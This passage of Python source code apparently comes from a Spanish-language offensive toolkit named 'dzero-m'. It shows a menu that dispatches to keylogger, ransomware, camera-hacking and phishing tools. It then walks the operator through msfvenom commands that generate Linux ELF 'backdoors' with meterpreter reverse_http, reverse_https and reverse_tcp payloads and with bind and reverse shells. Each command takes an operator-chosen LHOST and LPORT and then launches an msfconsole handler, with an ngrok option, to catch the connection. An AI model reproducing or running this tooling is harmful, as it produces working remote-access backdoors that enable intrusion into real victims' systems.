		if tool == '00':
			os.system('clear')
			main()
	
		elif tool == '01':
			kitools.TheFatRat()

		elif tool == '02':
			kitools.Msfpc()

		elif tool == '03':
			kitools.Fcrackzip()

		elif tool == '04':
			kitools.QRLjacker()

		elif tool == '05':
			kitools.Lazy()

		elif tool == '06':
			kitools.HTBINVITE()

		elif tool == '07':
			kitools.Ngrok()

		elif tool == '08':
			kitools.Bluepot()

		elif tool == '09':
			kitools.Setoolkit()

		elif tool == '10':
			kitools.A2sv()

		elif tool == '11':
			kitools.Fornonimizer()

		elif tool == '12':
			kitools.Easysploit()

		elif tool == '13':
			kitools.NXcrypt()

		elif tool == '14':
			kitools.KnockMail()

		elif tool == '15':
			kitools.RkHunter()

		elif tool == '16':
			kitools.HeraKeylogger()

		elif tool == '17':
			kitools.ZLogger()

		elif tool == '18':
			kitools.Xerosploit()

		elif tool == '19':
			kitools.Slacksec()

		elif tool == '20':
			kitools.Katana()

		elif tool == '21':
			kitools.Z0172CKTools()

		elif tool == '22':
			kitools.CamHack()

		elif tool == '23':
			kitools.Onex()

		elif tool == '24':
			kitools.Ransom0()

		elif tool == '25':
			kitools.Morpheus()

		elif tool == '26':
			kitools.FBTOOL()

		elif tool == '27':
			kitools.Venom()

		else:
			print("\n{}[X] OPCION INVALIDA".format(RED))
			time.sleep(1.5)
			os.system('clear')
			main()		

	elif option == '10':
		# sys msfvenom
		os.system('clear')
		print(msf_banner)
		print ('\n{0} [*] {1}Sys Payloads:\n'.format(DEFAULT, GREEN))
		print ('{0}[01] {1}LINUX {0}--> {2}dzero-m.elf'.format(WHITE, YELLOW, RED))
		print ('{0}[02] {1}WINDOWS {0}--> {2}dzero-m.exe'.format(WHITE, YELLOW, RED))
		print ('{0}[03] {1}ANDROID {0}--> {2}dzero-m.apk'.format(WHITE, YELLOW, RED))
		print ('{0}[04] {1}MAC OS {0}--> {2}dzero-m.macho'.format(WHITE, YELLOW, RED))
		print ('{0}[05] {1}PHP {0}--> {2}dzero-m.php'.format(WHITE, YELLOW, RED))
		print ('{0}[06] {1}PYTHON {0}--> {2}dzero-m.py'.format(WHITE, YELLOW, RED))
		print ('{0}[07] {1}BASH {0}--> {2}dzero-m.sh'.format(WHITE, YELLOW, RED))
		print ('{0}[08] {1}PERL {0}--> {2}dzero-m.pl'.format(WHITE, YELLOW, RED))
		print ('{0}[09] {1}RUN MSFCONSOLE {0}'.format(WHITE, YELLOW))
		print ('{0} [0] {1}Back'.format(WHITE, YELLOW))

		sys = input("{0}dzero-m >> {1}".format(RED, DEFAULT))
		sys = sys.zfill(2)

		if sys == '00':
			os.system('clear')
			main()

		elif sys == '01':
			print ('{0}\n[*] {1}Select Payload:\n'.format(DEFAULT, GREEN))
			print ('{0}[01]{1} linux/x64/meterpreter_reverse_http'.format(WHITE, YELLOW))
			print ('{0}[02]{1} linux/x64/meterpreter_reverse_https'.format(WHITE, YELLOW))
			print ('{0}[03]{1} linux/x64/meterpreter_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[04]{1} linux/x64/meterpreter/reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[05]{1} linux/x64/shell_bind_tcp'.format(WHITE, YELLOW))
			print ('{0}[06]{1} linux/x64/shell_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[07]{1} linux/x86/meterpreter_reverse_http'.format(WHITE, YELLOW))
			print ('{0}[08]{1} linux/x86/meterpreter_reverse_https'.format(WHITE, YELLOW))
			print ('{0}[09]{1} linux/x86/meterpreter_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[10]{1} linux/x86/meterpreter/reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[11]{1} linux/x86/shell_bind_tcp'.format(WHITE, YELLOW))
			print ('{0}[12]{1} linux/x86/shell_reverse_tcp'.format(WHITE, YELLOW))

			pay = input("{0}dzero-m >> {1}".format(RED, DEFAULT))
			pay = pay.zfill(2)
			
			if pay == '01':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x64/meterpreter_reverse_http LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))
				location = os.getcwd()
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:						
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x64/meterpreter_reverse_http; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '02':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x64/meterpreter_reverse_https LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))
				location = os.getcwd()	
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x64/meterpreter_reverse_https; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()			

			elif pay == '03':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))
				location = os.getcwd()
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x64/meterpreter_reverse_tcp; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '04':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))
				location = os.getcwd()
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x64/meterpreter/reverse_tcp; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '05':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x64/shell_bind_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))
				location = os.getcwd()
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/shell_bind_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x64/shell_bind_tcp; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '06':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x64/shell_reverse_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))
				location = os.getcwd()	
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x64/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x64/shell_reverse_tcp; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()		
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '07':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x86/meterpreter_reverse_http LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))	
				location = os.getcwd()
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x86/meterpreter_reverse_http; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '08':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x86/meterpreter_reverse_https LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x86/meterpreter_reverse_https; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()				

			elif pay == '09':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x86/meterpreter_reverse_tcp; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '10':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x86/meterpreter/reverse_tcp; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '11':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x86/shell_bind_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/shell_bind_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x86/shell_bind_tcp; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			elif pay == '12':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
				OUT = input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
				mainout = os.path.splitext(OUT)[0]
				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
				time.sleep(4)
				os.system('systemctl start postgresql && msfvenom -p linux/x86/shell_reverse_tcp LHOST={0} LPORT={1} -f elf > output/{2}.elf'.format(LHOST, LPORT, mainout))																				
				location = os.getcwd()
				if os.stat('output/{}.elf'.format(mainout)).st_size != 0:
					print("\n{0}[✔] Done.\n{1}Backdoor: {2}/output/{3}.elf".format(GREEN, DEFAULT, location, mainout))	
					if input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}dzero-m >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
						os.system('systemctl stop postgresql && clear')
						main()
					else:
						if not ".tcp.ngrok.io" in LHOST: 
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD linux/x86/shell_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
						else:
							os.system('xterm -T "dzero-m MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD linux/x86/shell_reverse_tcp; exploit\'"')
							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
							os.system('systemctl stop postgresql && clear')
							main()	
				else:
					print("{}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
					time.sleep(3)
					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
					os.system('systemctl stop postgresql && clear')
					main()	

			else:
				print("\n{}[X] OPCION INVALIDA\n".format(RED))
				time.sleep(3)
				pause("{}Presione cualquier tecla para continuar...".format(GREEN))
				os.system('clear')
				main()	

		elif sys == '02':
			print ('{0}\n [*] {1}Select Payload:\n'.format(DEFAULT, GREEN))
			print ('{0}[01]{1} windows/x64/meterpreter_reverse_http'.format(WHITE, YELLOW))
			print ('{0}[02]{1} windows/x64/meterpreter_reverse_https'.format(WHITE, YELLOW))
			print ('{0}[03]{1} windows/x64/meterpreter_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[04]{1} windows/x64/meterpreter/reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[05]{1} windows/x64/powershell_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[06]{1} windows/x64/shell_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[07]{1} windows/meterpreter_reverse_http'.format(WHITE, YELLOW))
			print ('{0}[08]{1} windows/meterpreter_reverse_https'.format(WHITE, YELLOW))
			print ('{0}[09]{1} windows/meterpreter_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[10]{1} windows/meterpreter/reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[11]{1} windows/meterpreter/reverse_tcp_dns'.format(WHITE, YELLOW))
			print ('{0}[12]{1} windows/metsvc_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[13]{1} windows/powershell_reverse_tcp'.format(WHITE, YELLOW))
			print ('{0}[14]{1} windows/shell_reverse_tcp'.format(WHITE, YELLOW))

			pay = input("{0}dzero-m >> {1}".format(RED, DEFAULT))
			pay = pay.zfill(2)

			if pay == '01':
				run_network()
				LHOST = input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
				LPORT = input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
